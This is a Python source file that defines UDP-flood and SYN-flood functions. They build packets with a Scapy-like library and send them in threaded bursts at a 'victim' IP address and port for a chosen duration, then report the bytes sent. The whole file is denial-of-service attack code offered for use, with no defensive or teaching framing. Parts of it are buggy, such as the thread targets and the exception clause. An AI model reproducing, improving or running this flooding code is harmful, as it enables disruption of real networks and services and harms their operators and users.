import  time, random, string, threading

from sys import stdout
from thirdparty.all import *

random_data = ''.join([random.choice(string.ascii_letters + string.digits)for x in range(65000)])

async def udp_strike(**kwargs):
    'udp flood function'

    UDPTHREADPOOL = []
    data_sent = 0

    end = time.time() + kwargs['time/Seconds']

    while time.time() < end:

        time.sleep(kwargs['sleep'])

        try:

            udp_packet = IP(dst=str(kwargs['victim/IP address']))/UDP(dport=int(kwargs['destination/Port']))/Raw(load=str(random_data))
            UDPTHREADPOOL.clear()   #   Need to clear the threads so it doesn't infinitely stack.

            for x in range(kwargs['threads']):

                UDPTHREADPOOL.append(threading.Thread(target=send(verbose=False, x=udp_packet)))

            for y in range(len(UDPTHREADPOOL)):

                UDPTHREADPOOL[y].start()
                UDPTHREADPOOL[y].join()
                UDPTHREADPOOL[y]._stop()

                data_sent += 65000

        except (PermissionError or ThreadGenSource):

            print ('\n[!!]\tMust run as root user or permission!\n[!!]\tCould not generate threads!')
            raise SystemExit

        stdout.write("\n[*]\tFinished successfully!\n"
                 "[#]\tSummary: Sent {} Bytes to host {victim/IP address} on port {destination/Port} in {time/Seconds} second(s)\n".format(data_sent, **kwargs)); raise SystemExit





async def syn_strike(**kwargs):
    'syn flood function'

    SYNTHREADPOOL = []
    data_sent = 0

    end = time.time() + kwargs['time/Seconds']

    while time.time() < end:

        time.sleep(kwargs['sleep'])


        try:

            tcp_packet = IP(dst=str(kwargs['victim/IP address']))/TCP(sport=RandShort(), dport=int(kwargs['destination/Port']), seq=123456, ack=74, window=None, flags='S')/Raw(load=str(random_data))
            SYNTHREADPOOL.clear()   #   Need to clear the threads so it doesn't infinitely stack.

            for x in range(kwargs['threads']):

                SYNTHREADPOOL.append(threading.Thread(target=send(verbose=False, x=tcp_packet)))

            for y in range(len(SYNTHREADPOOL)):

                SYNTHREADPOOL[y].start()
                SYNTHREADPOOL[y].join()
                SYNTHREADPOOL[y]._stop()

                data_sent += 65000

        except (PermissionError or ThreadGenSource):

            print ('\n[!!]\tMust run as root user or permission!\n[!!]\tCould not generate threads!')
            raise SystemExit

    stdout.write("\n[*]\tFinished successfully!\n"
                 "[#]\tSummary: Sent {} Bytes to host {victim/IP address} on port {destination/Port} in {time/Seconds} second(s)\n".format(data_sent, **kwargs)); raise SystemExit


